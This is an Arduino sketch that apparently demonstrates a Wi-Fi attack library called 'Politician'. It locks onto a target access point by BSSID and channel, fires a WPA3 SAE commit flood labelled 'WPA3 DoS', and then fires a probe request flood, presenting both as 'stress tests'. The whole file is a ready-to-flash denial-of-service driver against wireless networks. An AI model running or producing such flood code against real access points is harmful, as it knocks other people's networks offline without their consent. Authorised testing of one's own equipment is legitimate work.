#include <Arduino.h>
#include "Politician.h"
#include "PoliticianStress.h"

using namespace politician;
using namespace politician::stress;

Politician engine;
const uint8_t TARGET_BSSID[6] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06 };

void setup() {
    Serial.begin(115200);
    delay(2000);

    Serial.println("[+] Booting Engine & Halting Hopper...");
    Config cfg;
    engine.begin(cfg);
    
    // Lock frequency
    engine.setTarget(TARGET_BSSID, 6);
    
    Serial.println("[+] Firing Massive SAE Commit Flood (WPA3 DoS) over 5 seconds...");
    saeCommitFlood(TARGET_BSSID, 5000);
    
    Serial.println("[+] Firing Massive Probe Request Flood over 5 seconds...");
    probeRequestFlood(5000);

    Serial.println("[+] Stress Tests Executed Successfully!");
}

void loop() {
    delay(1000);
}
